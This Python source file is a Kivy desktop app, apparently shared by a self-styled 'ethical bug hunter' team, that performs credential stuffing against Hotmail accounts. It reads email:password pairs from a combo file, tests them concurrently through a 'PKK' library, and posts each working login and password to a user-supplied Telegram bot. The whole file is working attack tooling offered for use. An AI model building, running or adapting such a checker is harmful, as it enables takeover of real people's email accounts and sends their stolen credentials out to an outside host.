import PKK
import requests
from concurrent.futures import ThreadPoolExecutor
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.clock import Clock

class HotmailChecker(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation="vertical", **kwargs)
        self.count_good = 0
        self.count_bad = 0

        # Header - Team Information
        self.add_widget(Label(
            text="TEAM: ETHICAL BUG HUNTER\nDeveloper: Last Warning\nTG ID: @hardhackar007",
            font_size=35, bold=True, color=(1, 1, 0, 1)  # Yellowish header
        ))

        # Token Input
        self.add_widget(Label(text="Enter your Bot Token:", font_size=18))
        self.token_input = TextInput(hint_text="Your Telegram Bot Token", multiline=False)
        self.add_widget(self.token_input)

        # ID Input
        self.add_widget(Label(text="Enter your Telegram ID:", font_size=18))
        self.id_input = TextInput(hint_text="Your Telegram ID", multiline=False)
        self.add_widget(self.id_input)

        # File Path Input
        self.add_widget(Label(text="Enter your Combo Path:", font_size=18))
        self.file_input = TextInput(hint_text="Path to combo.txt", multiline=False)
        self.add_widget(self.file_input)

        # Start Button
        self.start_button = Button(text="START", font_size=22, bold=True, on_press=self.start_check)
        self.add_widget(self.start_button)

        # Status Labels
        self.status_label = Label(text="Waiting for input...", font_size=22)
        self.add_widget(self.status_label)

        # Good Login Label (Big & Green)
        self.good_label = Label(text="✅ GOOD LOGINS: 0", color=(0, 1, 0, 1), font_size=30, bold=True)
        self.add_widget(self.good_label)

        # Bad Login Label (Big & Red)
        self.bad_label = Label(text="❌ BAD LOGINS: 0", color=(1, 0, 0, 1), font_size=30, bold=True)
        self.add_widget(self.bad_label)

    def start_check(self, instance):
        token = self.token_input.text
        chat_id = self.id_input.text
        file_path = self.file_input.text

        if not token or not chat_id or not file_path:
            self.status_label.text = "❌ Please fill all fields!"
            return

        self.status_label.text = "⏳ Checking logins..."
        executor = ThreadPoolExecutor(max_workers=30)

        try:
            with open(file_path, "r") as f:
                for line in f:
                    if ":" in line:
                        email, password = line.strip().split(":", 1)
                        executor.submit(self.login, email, password, token, chat_id)
        except Exception as e:
            self.status_label.text = f"⚠️ Error: {e}"

    def login(self, email, password, token, chat_id):
        try:
            response = PKK.Hotmail.Login(email, password)
            if response.get("Login") == "Good":
                self.count_good += 1
                telegram_message = f"""
┏━━━━━━━⍟
┃ {email}
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃ {password}
┗━━━━━━━━━━━⊛
☠️ TOOL DEVELOPER BY LAST WARNING  
    TG ID @hardhackar007 ☠️
┏━━━━━━━⍟
┃ Login URL: https://login.live.com
┃ TEAM: ETHICAL BUG HUNTER
┗━━━━━━━━━━━⊛
"""
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={telegram_message}")
                Clock.schedule_once(lambda dt: self.update_good_label(), 0)
            else:
                self.count_bad += 1
                Clock.schedule_once(lambda dt: self.update_bad_label(), 0)
        except Exception as e:
            pass

    def update_good_label(self):
        self.good_label.text = f"✅ GOOD LOGIN: {self.count_good}"
        self.good_label.font_size = 32  # Bigger text

    def update_bad_label(self):
        self.bad_label.text = f"❌ BAD LOGIN: {self.count_bad}"
        self.bad_label.font_size = 32  # Bigger text

class HotmailCheckerApp(App):
    def build(self):
        return HotmailChecker()

if __name__ == "__main__":
    HotmailCheckerApp().run()
